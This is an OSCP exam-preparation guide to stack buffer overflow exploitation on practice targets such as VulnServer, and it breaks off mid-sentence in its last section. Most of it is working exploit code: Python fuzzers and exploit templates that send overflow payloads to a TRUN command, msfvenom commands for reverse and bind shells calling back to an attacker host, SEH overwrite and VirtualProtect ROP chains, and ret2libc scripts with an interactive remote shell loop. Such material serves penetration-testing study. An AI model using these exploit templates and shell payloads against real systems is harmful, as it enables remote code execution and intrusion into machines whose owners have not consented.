# Buffer Overflow Exploitation Guide (OSCP)

## Table of Contents
1. [Basic Concepts](#basic-concepts)
2. [Stack-Based Buffer Overflow](#stack-based-buffer-overflow)
3. [Exploitation Workflow](#exploitation-workflow)
4. [Fuzzing](#fuzzing)
5. [Finding the Offset](#finding-the-offset)
6. [Controlling EIP](#controlling-eip)
7. [Finding Bad Characters](#finding-bad-characters)
8. [Finding Return Address](#finding-return-address)
9. [Generating Shellcode](#generating-shellcode)
10. [SEH-Based Overflow](#seh-based-overflow)
11. [Bypass Techniques](#bypass-techniques)
12. [Common Pitfalls](#common-pitfalls)

---

## Basic Concepts

### Memory Layout (32-bit Windows)
```
HIGH MEMORY
+-----------------+
|    Kernel       |
+-----------------+
|    Stack        |  <- Grows DOWN
|       ↓         |
+-----------------+
|                 |
+-----------------+
|       ↑         |
|    Heap         |  <- Grows UP
+-----------------+
|    .data        |  <- Initialized data
+-----------------+
|    .text        |  <- Code section
+-----------------+
LOW MEMORY
```

### Stack Frame Structure
```
+------------------+
| Function Args    |
+------------------+
| Return Address   |  <- EIP points here after RET
+------------------+
| Saved EBP        |  <- EBP
+------------------+
| Local Variables  |  <- ESP points here
| Buffer Space     |
+------------------+
```

### Important Registers (x86)
- **EIP** (Extended Instruction Pointer): Points to next instruction to execute
- **ESP** (Extended Stack Pointer): Points to top of stack
- **EBP** (Extended Base Pointer): Points to base of current stack frame
- **EAX, EBX, ECX, EDX**: General purpose registers

---

## Stack-Based Buffer Overflow

### Vulnerable Code Example (C)
```c
#include <string.h>
#include <stdio.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

### What Happens During Overflow
1. Buffer is allocated on stack (e.g., 64 bytes)
2. Large input overflows buffer
3. Overflow overwrites saved EBP
4. Overflow overwrites return address (saved EIP)
5. When function returns, execution jumps to attacker-controlled address

---

## Exploitation Workflow

### OSCP Buffer Overflow Steps
```
1. Fuzzing           -> Find crash point
2. Find Offset       -> Locate EIP overwrite position
3. Control EIP       -> Verify control with unique pattern
4. Find Bad Chars    -> Identify characters that break exploit
5. Find JMP ESP      -> Locate reliable return address
6. Generate Payload  -> Create shellcode without bad chars
7. Exploit           -> Execute and get shell
```

---

## Fuzzing

### Manual Fuzzing with Python
```python
#!/usr/bin/env python3
import socket
import sys

# Target configuration
target_ip = "192.168.1.100"
target_port = 9999

# Create increasing buffer sizes
buffer = "A" * 100

while True:
    try:
        print(f"[*] Sending buffer of size: {len(buffer)}")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, target_port))

        # Receive banner if exists
        s.recv(1024)

        # Send payload
        s.send(bytes(buffer + "\r\n", "latin-1"))
        s.close()

        # Increase buffer size
        buffer += "A" * 100

    except Exception as e:
        print(f"[!] Crashed at {len(buffer)} bytes")
        print(f"[!] Error: {e}")
        sys.exit(0)
```

### Automated Fuzzing with Spike
```bash
# Create spike script: vulnserver.spk
s_readline();
s_string("TRUN ");
s_string_variable("COMMAND");

# Run spike
generic_send_tcp 192.168.1.100 9999 vulnserver.spk 0 0
```

### Boofuzz Fuzzing (Modern)
```python
from boofuzz import *

session = Session(
    target=Target(
        connection=SocketConnection("192.168.1.100", 9999, proto='tcp')
    ),
)

s_initialize(name="Request")
s_string("TRUN ", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("FUZZ")

session.connect(s_get("Request"))
session.fuzz()
```

---

## Finding the Offset

### Using Metasploit Pattern Create
```bash
# Create unique pattern (3000 bytes)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

# Output: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3...
```

### Python Exploit to Send Pattern
```python
#!/usr/bin/env python3
import socket

target_ip = "192.168.1.100"
target_port = 9999

# Pattern from pattern_create
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag..."

payload = b"TRUN /.:/" + pattern.encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(payload)
s.close()
```

### Finding Offset with Immunity Debugger
1. Attach Immunity to vulnerable process
2. Run exploit script with pattern
3. Note EIP value when crash occurs (e.g., `386F4337`)
4. Find offset:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337 -l 3000

# Output: [*] Exact match at offset 2003
```

### Alternative: mona.py in Immunity
```
!mona findmsp -distance 3000
```

---

## Controlling EIP

### Verify Offset Control
```python
#!/usr/bin/env python3
import socket

target_ip = "192.168.1.100"
target_port = 9999

# Offset found: 2003 bytes
offset = 2003

# Build payload
buffer = b"A" * offset
eip = b"B" * 4          # Should appear as 42424242 in EIP
padding = b"C" * 400

payload = b"TRUN /.:/" + buffer + eip + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(payload)
s.close()
```

**Expected Result**: EIP should show `42424242` (BBBB in hex)

---

## Finding Bad Characters

### Why Bad Characters Matter
Certain bytes break exploits:
- **0x00** (NULL): String terminators in C functions
- **0x0A** (Line Feed): String terminators
- **0x0D** (Carriage Return): String terminators
- Application-specific bad chars

### Generate All Characters (0x01 to 0xFF)
```python
# Bad chars test array (excluding 0x00)
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

### Bad Character Test Exploit
```python
#!/usr/bin/env python3
import socket

target_ip = "192.168.1.100"
target_port = 9999
offset = 2003

# Include all characters for testing
badchars = b"\x01\x02\x03...\xff"  # Full array from above

buffer = b"A" * offset
eip = b"B" * 4
padding = badchars  # Send all chars after EIP

payload = b"TRUN /.:/" + buffer + eip + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(payload)
s.close()
```

### Finding Bad Chars in Immunity Debugger
1. After crash, right-click ESP register → "Follow in Dump"
2. Compare hex dump with expected sequence (01 02 03 04...)
3. Look for:
   - **Missing bytes**: Bad character removed
   - **Corrupted sequence**: Characters after bad char are corrupted
   - **Truncation**: Everything after bad char is missing

### Using mona.py to Find Bad Chars
```
# Generate byte array file
!mona bytearray -cpb "\x00"

# Compare memory with byte array
!mona compare -f C:\logs\vulnserver\bytearray.bin -a <ESP address>
```

### Common Bad Character Lists (OSCP)
```
Most Common:  \x00 \x0a \x0d
HTTP:         \x00 \x0a \x0d \x20 \x23 \x25 \x3f
FTP:          \x00 \x0a \x0d
SMB:          \x00
Custom Apps:  Varies - always test!
```

---

## Finding Return Address

### Goal: Find "JMP ESP" Instruction
We need a reliable address containing `JMP ESP` (opcode: `\xFF\xE4`)

### Requirements for Good Return Address
1. **No ASLR**: Address must be static across reboots
2. **No DEP/SafeSEH**: Module shouldn't have protections
3. **No NULL bytes**: Address shouldn't contain bad chars
4. **Reliable**: Should work consistently

### Using mona.py to Find Modules
```
# List all modules and protections
!mona modules

# Look for modules with:
# - Rebase: False
# - SafeSEH: False
# - ASLR: False
# - NXCompat: False
```

### Finding JMP ESP in Vulnerable Module
```
# Find JMP ESP instruction (FFE4)
!mona find -s "\xff\xe4" -m vulnerable_module.dll

# Alternative: Find all JMP ESP
!mona jmp -r esp -m vulnerable_module.dll

# Output example:
# 0x625011af : "\xff\xe4" | {PAGE_EXECUTE_READ} [vulnerable_module.dll]
```

### Using nasm_shell.rb to Find Opcodes
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm > jmp esp
00000000  FFE4              jmp esp

nasm > call esp
00000000  FFD4              call esp
```

### Manual Search with Immunity
```
# In Immunity command bar
s FFE4  # Search for JMP ESP opcode
```

### Verify Return Address
```python
#!/usr/bin/env python3
import socket
import struct

target_ip = "192.168.1.100"
target_port = 9999
offset = 2003

# Return address found: 0x625011af
# Convert to little-endian format
return_addr = struct.pack("<I", 0x625011af)

buffer = b"A" * offset
eip = return_addr
padding = b"C" * 400

payload = b"TRUN /.:/" + buffer + eip + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(payload)
s.close()
```

**Verify**: Set breakpoint at JMP ESP address, confirm execution reaches it

---

## Generating Shellcode

### Using msfvenom
```bash
# Windows reverse shell (excluding bad chars)
msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.10.14.5 \
    LPORT=443 \
    -f c \
    -b "\x00\x0a\x0d" \
    -e x86/shikata_ga_nai \
    EXITFUNC=thread

# Meterpreter reverse shell
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 \
    LPORT=443 \
    -f python \
    -b "\x00\x0a\x0d" \
    -e x86/shikata_ga_nai

# Windows bind shell
msfvenom -p windows/shell_bind_tcp \
    LPORT=4444 \
    -f c \
    -b "\x00\x0a\x0d"

# Add NOP sled for stability
# Shellcode often needs decoder stub space
```

### Common msfvenom Options
```
-p  : Payload
-f  : Format (c, python, raw, exe, dll)
-b  : Bad characters to avoid
-e  : Encoder (shikata_ga_nai, fnstenv_mov)
-i  : Encoding iterations (default 1)
-a  : Architecture (x86, x64)
--platform : Platform (windows, linux)
EXITFUNC=thread : Cleaner exit (no crash)
```

### Final Exploit with Shellcode
```python
#!/usr/bin/env python3
import socket
import struct

target_ip = "192.168.1.100"
target_port = 9999
offset = 2003

# JMP ESP address (little-endian)
return_addr = struct.pack("<I", 0x625011af)

# msfvenom generated shellcode
buf = b""
buf += b"\xda\xc1\xba\xe4\x5e\x2d\xde\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x52\x83\xc0\x04\x31\x50\x13\x03\x1d\x8e\x2a"
# ... (truncated for brevity)

# NOP sled for stability (16-32 bytes)
nop_sled = b"\x90" * 16

# Build final payload
buffer = b"A" * offset
eip = return_addr
payload_final = buffer + eip + nop_sled + buf

print(f"[*] Sending exploit ({len(payload_final)} bytes)")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(b"TRUN /.:/" + payload_final)
s.close()

print("[*] Exploit sent!")
```

### Netcat Listener
```bash
# Start listener before running exploit
nc -nlvp 443

# Or use Metasploit handler
msfconsole -q -x "use exploit/multi/handler; \
    set payload windows/meterpreter/reverse_tcp; \
    set LHOST 10.10.14.5; \
    set LPORT 443; \
    exploit"
```

---

## SEH-Based Overflow

### SEH (Structured Exception Handler) Basics
Windows exception handling mechanism. Chain of exception handlers on stack.

### SEH Chain Structure
```
+-------------------------+
| Next SEH Record (nSEH)  | <- Pointer to next handler
+-------------------------+
| SEH Handler (SE Handler)| <- Pointer to handler code
+-------------------------+
```

### SEH Exploitation Technique
1. Overflow to overwrite SEH chain
2. Overwrite SE Handler with POP POP RET address
3. Overwrite nSEH with short jump to shellcode
4. Trigger exception
5. POP POP RET cleans stack and returns to nSEH
6. Short jump leads to shellcode

### Finding POP POP RET
```
# Using mona.py
!mona seh -m vulnerable_module.dll

# Output: 0x625011bb : pop ebx # pop ebp # ret
```

### SEH Exploit Template
```python
#!/usr/bin/env python3
import socket
import struct

offset_to_seh = 3500  # Offset to SEH overwrite
pop_pop_ret = struct.pack("<I", 0x625011bb)

# Short jump over SE Handler (jump forward 6 bytes)
# Assembly: JMP +06
# Opcode: \xeb\x06\x90\x90
short_jump = b"\xeb\x06\x90\x90"

# Shellcode after SE Handler
shellcode = b"\x90" * 16 + buf  # NOP sled + payload

buffer = b"A" * offset_to_seh
nseh = short_jump
seh = pop_pop_ret

payload = buffer + nseh + seh + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 9999))
s.send(payload)
s.close()
```

---

## Bypass Techniques

### ASLR Bypass (Advanced - Beyond OSCP)
- Use modules without ASLR
- Information leak to find addresses
- ROP chains with known addresses

### DEP/NX Bypass
- **For OSCP**: Find modules without DEP
- ROP (Return-Oriented Programming) for advanced scenarios
- VirtualProtect ROP chain to mark stack executable

### SafeSEH Bypass
- Use modules compiled without SafeSEH
- Find SEH overwrites in non-protected modules
- Use of PPR (POP POP RET) from unprotected modules

### Checking Protections with mona.py
```
!mona modules

# Look for:
# Rebase, SafeSEH, ASLR, NXCompat all = False
```

---

## Common Pitfalls

### 1. Incorrect Offset Calculation
```
WRONG: offset = crash_size
RIGHT: offset = pattern_offset result
```

### 2. Endianness Issues
```python
WRONG: eip = 0x625011af  # Big-endian
RIGHT: eip = struct.pack("<I", 0x625011af)  # Little-endian
       # Result: \xaf\x11\x50\x62
```

### 3. Forgetting Bad Characters
Always test and exclude bad chars from:
- Return address
- Shellcode encoding

### 4. Insufficient NOP Sled
Add 16-32 byte NOP sled before shellcode for decoder stub space

### 5. EXITFUNC Not Set
```bash
# Without EXITFUNC=thread, app crashes after shell exits
msfvenom ... EXITFUNC=thread
```

### 6. Wrong Architecture
```bash
# Verify target architecture
WRONG: msfvenom -p windows/x64/...  # 64-bit payload on 32-bit app
RIGHT: msfvenom -p windows/shell_reverse_tcp ...  # 32-bit default
```

### 7. Firewall Blocking Reverse Shell
```bash
# Test bind shell if reverse fails
# Or use alternative ports (80, 443, 53)
```

---

## OSCP Exam Tips

### Time-Saving Steps
1. Use mona.py extensively (automates offset, bad chars, SEH)
2. Keep exploit template ready
3. Test locally first (SLMail, VulnServer, etc.)

### Quick Checklist
- [ ] Fuzzing completed, crash size identified
- [ ] Offset found with pattern_create/offset
- [ ] EIP control verified (42424242)
- [ ] Bad characters identified and documented
- [ ] JMP ESP found in non-protected module
- [ ] Return address verified (no bad chars)
- [ ] Shellcode generated with correct bad chars
- [ ] NOP sled added (16+ bytes)
- [ ] Listener started before exploit
- [ ] Exploit executed successfully

### OSCP Buffer Overflow Machines (Practice)
- **brainpan** (TryHackMe/VulnHub)
- **gatekeeper** (TryHackMe)
- **brainstorm** (TryHackMe)
- **SLMail 5.5** (Local testing)
- **VulnServer** (Local testing)
- **Minishare 1.4.1** (Local testing)

---

## Tools Reference

### Essential Tools
- **Immunity Debugger** + mona.py
- **pattern_create.rb / pattern_offset.rb**
- **msfvenom**
- **Python 3** for exploit scripts
- **nc/ncat** for listeners

### Mona.py Commands Quick Reference
```
!mona config -set workingfolder C:\logs\%p
!mona findmsp -distance 3000
!mona bytearray -cpb "\x00"
!mona compare -f bytearray.bin -a <ESP>
!mona modules
!mona find -s "\xff\xe4" -m module.dll
!mona jmp -r esp -m module.dll
!mona seh -m module.dll
```

### Python Struct Pack Formats
```python
struct.pack("<I", 0x12345678)  # Little-endian 32-bit
struct.pack(">I", 0x12345678)  # Big-endian 32-bit
struct.pack("<Q", 0x12345678)  # Little-endian 64-bit
```

---

## Complete Exploit Template

```python
#!/usr/bin/env python3
"""
Buffer Overflow Exploit Template
Target: [Application Name]
Vulnerability: Stack-based buffer overflow
Author: [Your Name]
"""

import socket
import struct
import sys

# ==========================
# CONFIGURATION
# ==========================
TARGET_IP = "192.168.1.100"
TARGET_PORT = 9999
OFFSET = 2003
RETURN_ADDR = 0x625011af  # JMP ESP address
BAD_CHARS = b"\x00\x0a\x0d"

# ==========================
# SHELLCODE
# ==========================
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
#   -f python -b "\x00\x0a\x0d" -e x86/shikata_ga_nai EXITFUNC=thread

buf = b""
buf += b"\xda\xdb\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x52\xba\x9f"
# ... shellcode here ...

# ==========================
# EXPLOIT
# ==========================
def exploit():
    try:
        print(f"[*] Connecting to {TARGET_IP}:{TARGET_PORT}")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET_IP, TARGET_PORT))

        # Receive banner
        banner = s.recv(1024)
        print(f"[*] Banner: {banner.decode('latin-1', errors='ignore')}")

        # Build payload
        buffer = b"A" * OFFSET
        eip = struct.pack("<I", RETURN_ADDR)
        nop_sled = b"\x90" * 16

        payload = b"TRUN /.:/" + buffer + eip + nop_sled + buf

        print(f"[*] Sending payload ({len(payload)} bytes)")
        s.send(payload)
        s.close()

        print("[+] Exploit sent successfully!")
        print(f"[*] Check your listener on port 443")

    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    exploit()
```

---

## Advanced: ROP Chains (Return-Oriented Programming)

### What is ROP?

**Return-Oriented Programming:**
- Technique to bypass DEP/NX (non-executable stack/heap)
- Chain together existing code snippets ("gadgets")
- Each gadget ends with RET instruction
- No shellcode injection needed

**Use Case:**
- DEP/NX enabled (stack not executable)
- Traditional shellcode won't work
- Need to use existing executable code

---

### ROP Gadgets

**Gadget:** Small instruction sequence ending in RET

**Examples:**
```assembly
; POP gadget
pop eax
ret

; MOV gadget
mov eax, ebx
ret

; ADD gadget
add eax, ecx
ret

; CALL gadget
call [eax]
ret
```

**Finding Gadgets:**
```bash
# Using ropper
ropper --file vulnerable.exe --search "pop eax"

# Using ROPgadget
ROPgadget --binary vulnerable.exe --only "pop|ret"

# Using mona.py in Immunity
!mona rop -m vulnerable.dll -cpb "\x00\x0a\x0d"
```

---

### ROP Chain Example: VirtualProtect

**Goal:** Mark stack as executable, then execute shellcode

**Windows API:**
```c
BOOL VirtualProtect(
    LPVOID lpAddress,        // Address to protect (ESP)
    SIZE_T dwSize,           // Size (0x500)
    DWORD  flNewProtect,     // Protection (0x40 = PAGE_EXECUTE_READWRITE)
    PDWORD lpflOldProtect    // Pointer to old protection
);
```

**ROP Chain Strategy:**
1. Set up function arguments on stack
2. Call VirtualProtect via gadgets
3. Return to shellcode on now-executable stack

---

### Building VirtualProtect ROP Chain

**Using mona.py (Automated):**
```
# Generate ROP chain for VirtualProtect
!mona rop -m vulnerable.dll -cpb "\x00\x0a\x0d"

# Creates rop.txt with gadgets
# Creates rop_chains.txt with ready-to-use chain
```

**Example ROP Chain (32-bit):**
```python
#!/usr/bin/env python3
import struct

def p(addr):
    return struct.pack("<I", addr)

# Gadgets found in vulnerable.dll
pop_eax = p(0x10101010)      # POP EAX ; RET
pop_ebx = p(0x10101020)      # POP EBX ; RET
pop_ecx = p(0x10101030)      # POP ECX ; RET
pop_edx = p(0x10101040)      # POP EDX ; RET
pushad = p(0x10101050)       # PUSHAD ; RET
virtualprotect = p(0x10101060)  # Address of VirtualProtect

# Build ROP chain
rop_chain = b""
rop_chain += pop_eax
rop_chain += virtualprotect  # EAX = VirtualProtect address
rop_chain += pop_ebx
rop_chain += p(0x00000500)   # EBX = dwSize (1280 bytes)
rop_chain += pop_ecx
rop_chain += p(0x00000040)   # ECX = flNewProtect (PAGE_EXECUTE_READWRITE)
rop_chain += pop_edx
rop_chain += p(0x10101100)   # EDX = lpflOldProtect (writable address)
# ... continue chain to call VirtualProtect
# ... then return to shellcode
```

---

### ROP Exploit Template

```python
#!/usr/bin/env python3
import socket
import struct

target_ip = "192.168.1.100"
target_port = 9999
offset = 2003

# Shellcode (will be executed after VirtualProtect)
shellcode = b"\x90" * 16 + buf  # NOP sled + payload

# ROP chain (generated by mona.py)
rop_chain = b""
# ... (insert mona-generated ROP chain here)

# Build exploit
buffer = b"A" * offset
eip = struct.pack("<I", 0x10101010)  # First ROP gadget
payload = buffer + eip + rop_chain + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(b"TRUN /.:/" + payload)
s.close()
```

---

### Common ROP Gadgets (x86)

```assembly
; Stack manipulation
pop eax ; ret
pop ebx ; ret
pop ecx ; ret
pop edx ; ret
push eax ; ret
pushad ; ret

; Arithmetic
add eax, ebx ; ret
sub eax, ecx ; ret
xor eax, eax ; ret
inc eax ; ret

; Memory operations
mov [eax], ebx ; ret
mov eax, [ebx] ; ret
xchg eax, esp ; ret

; Control flow
call eax ; ret
jmp eax
jmp esp
```

---

## Advanced: ret2libc

### What is ret2libc?

**Return-to-libc:**
- Return to existing library functions instead of shellcode
- Common on Linux (libc.so)
- Bypass non-executable stack (NX/DEP)
- No shellcode needed

**Target Functions:**
- `system()` - Execute shell command
- `execve()` - Execute binary
- `mprotect()` - Change memory protections

---

### ret2libc Strategy (Linux)

**Goal:** Call `system("/bin/sh")`

**Requirements:**
1. Address of `system()` function
2. Address of `/bin/sh` string
3. Stack layout for function call

**32-bit Stack Layout:**
```
+-------------------+
| Return Address    | <- After system() executes
+-------------------+
| system() address  | <- Overwrites EIP
+-------------------+
| Argument: "/bin/sh" address |
+-------------------+
```

---

### Finding Addresses (Linux)

**Method 1: GDB**
```bash
# Start GDB
gdb ./vulnerable

# Find system() address
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e63190 <system>

# Find /bin/sh string
(gdb) find &system,+9999999,"/bin/sh"
0xb7f83a24
(gdb) x/s 0xb7f83a24
0xb7f83a24:  "/bin/sh"
```

**Method 2: Python (pwntools)**
```python
from pwn import *

# Load binary
elf = ELF('./vulnerable')
libc = elf.libc

# Get addresses
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

print(f"system: {hex(system_addr)}")
print(f"/bin/sh: {hex(binsh_addr)}")
```

**Method 3: Exploit Runtime**
```python
#!/usr/bin/env python3
import struct

# Known offsets (found via analysis)
libc_base = 0xb7e00000
system_offset = 0x00063190
binsh_offset = 0x00183a24

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
```

---

### ret2libc Exploit (32-bit Linux)

```python
#!/usr/bin/env python3
import struct
import sys

# Addresses (adjust based on target)
system_addr = 0xb7e63190
exit_addr = 0xb7e56260
binsh_addr = 0xb7f83a24

offset = 112  # Offset to EIP

# Build payload
buffer = b"A" * offset
eip = struct.pack("<I", system_addr)   # Overwrite EIP with system()
ret = struct.pack("<I", exit_addr)     # Return address (clean exit)
arg = struct.pack("<I", binsh_addr)    # Argument: "/bin/sh"

payload = buffer + eip + ret + arg

# Write to file or send over network
sys.stdout.buffer.write(payload)
```

**Usage:**
```bash
# Generate payload
python3 exploit.py > payload

# Exploit locally
./vulnerable < payload

# Or over network
(python3 exploit.py; cat) | nc target 9999
```

---

### ret2libc with ASLR Bypass

**Problem:** ASLR randomizes library addresses

**Solution 1: Information Leak**
```python
# Leak libc address from GOT/PLT
# Calculate other addresses based on leak
# Send second payload with correct addresses
```

**Solution 2: Partial Overwrite**
```python
# Only overwrite least significant bytes
# ASLR doesn't randomize lowest 12 bits
# Requires brute force or multiple attempts
```

**Solution 3: ret2plt**
```python
# Return to PLT entries (not randomized)
# Chain PLT calls to leak addresses
# Then perform actual exploit
```

---

### ret2libc on 64-bit Linux

**Calling Convention:**
- Arguments passed in registers (RDI, RSI, RDX, RCX, R8, R9)
- Not on stack like 32-bit

**Requirements:**
- Need ROP gadgets to populate registers
- `pop rdi ; ret` to set first argument

**Example:**
```python
#!/usr/bin/env python3
import struct

def p64(addr):
    return struct.pack("<Q", addr)

# Addresses
system_addr = 0x7ffff7e63190
binsh_addr = 0x7ffff7f83a24
pop_rdi = 0x0000000000401234  # pop rdi ; ret gadget

offset = 120

# Build payload
buffer = b"A" * offset
rop_chain = b""
rop_chain += p64(pop_rdi)       # pop rdi ; ret
rop_chain += p64(binsh_addr)    # argument for system()
rop_chain += p64(system_addr)   # call system()

payload = buffer + rop_chain
sys.stdout.buffer.write(payload)
```

---

### Finding ROP Gadgets (Linux)

**Using ROPgadget:**
```bash
# Find pop rdi gadget
ROPgadget --binary vulnerable --only "pop|ret" | grep rdi

# Find all useful gadgets
ROPgadget --binary vulnerable > gadgets.txt

# Search for specific instruction
ROPgadget --binary vulnerable --search "pop rdi"
```

**Using ropper:**
```bash
# Interactive mode
ropper --file vulnerable

# Search for gadget
ropper --file vulnerable --search "pop rdi"

# Generate ROP chain
ropper --file vulnerable --chain "execve cmd=/bin/sh"
```

---

### ret2libc Exploit (Complete Example)

```python
#!/usr/bin/env python3
"""
ret2libc Exploit for Linux Buffer Overflow
Bypasses NX by returning to system() in libc
"""
import socket
import struct
import sys

# ==========================
# CONFIGURATION
# ==========================
TARGET_IP = "192.168.1.100"
TARGET_PORT = 9999
OFFSET = 112

# Libc addresses (adjust for target)
LIBC_BASE = 0xb7e00000
SYSTEM_OFFSET = 0x00048150
EXIT_OFFSET = 0x0003ada0
BINSH_OFFSET = 0x0017b8cf

SYSTEM_ADDR = LIBC_BASE + SYSTEM_OFFSET
EXIT_ADDR = LIBC_BASE + EXIT_OFFSET
BINSH_ADDR = LIBC_BASE + BINSH_OFFSET

# ==========================
# EXPLOIT
# ==========================
def exploit():
    # Build payload
    buffer = b"A" * OFFSET
    eip = struct.pack("<I", SYSTEM_ADDR)  # system()
    ret = struct.pack("<I", EXIT_ADDR)    # exit() for clean exit
    arg = struct.pack("<I", BINSH_ADDR)   # "/bin/sh"

    payload = buffer + eip + ret + arg

    # Send exploit
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    s.recv(1024)
    s.send(payload)

    # Interactive shell
    while True:
        cmd = input("$ ")
        s.send(cmd.encode() + b"\n")
        print(s.recv(4096).decode())

if __name__ == "__main__":
    exploit()
```

---

## ROP vs ret2libc Comparison

| Feature | ROP Chains | ret2libc |
|---------|------------|----------|
| **Platform** | Windows/Linux | Primarily Linux |
| **Complexity** | High (many gadgets) | Medium (function calls) |
| **Bypass** | DEP/NX | NX/ASLR (partial) |
| **Stability** | Can be fragile | More reliable |
| **OSCP Relevance** | ⚠️ Advanced | ⚠️ Advanced |

---

## Advanced DEP Bypass Techniques

### 1. VirtualProtect ROP Chain (Windows)

**Goal:** Mark stack as RWX (Read-Write-Execute)

**Steps:**
1. Use ROP gadgets to call VirtualProtect()
2. Arguments: lpAddress=ESP, dwSize=0x500, flNewProtect=0x40
3. Return to shellcode on now-executable stack

**Automated with mona.py:**
```
!mona rop -m vulnerable.dll -cpb "\x00\x0a\x0d"
```

---

### 2. VirtualAlloc ROP Chain (Windows)

**Goal:** Allocate new executable memory

**API:**
```c
LPVOID VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);
```

**Advantages:**
- Allocates fresh memory
- Less likely to interfere with stack

---

### 3. WriteProcessMemory + CreateThread (Windows)

**Goal:** Write shellcode to remote process and execute

**ROP Chain:**
1. Call WriteProcessMemory() to write shellcode
2. Call CreateThread() to execute shellcode

**Complex but powerful:**
- Full process control
- Clean execution

---

### 4. Heap Spray + ROP (Advanced)

**Technique:**
1. Spray heap with ROP gadgets and shellcode
2. Overflow to jump to predictable heap address
3. Execute ROP chain from heap

**OSCP Relevance:** Low (too advanced)

---

## OSCP Relevance: ROP and ret2libc

### When to Use

**OSCP Exam:**
- **Standard BOF:** Traditional shellcode injection (most common)
- **DEP Enabled:** Use ROP or ret2libc (rare in exam)
- **SEH Overwrite:** More common than ROP

**Recommendation:**
- Master standard BOF first
- Understand ROP concepts
- Practice ret2libc on Linux boxes
- Don't over-complicate exam exploits

---

### Practical OSCP Scenarios

**Scenario 1: Windows BOF with DEP**
```
1. Check if DEP enabled: !mona modules
2. If DEP on vulnerable module → use that module (no DEP bypass needed)
3. If DEP on all modules → ROP chain with VirtualProtect
```

**Scenario 2: Linux BOF with NX**
```
1. Check NX: checksec --file=vulnerable
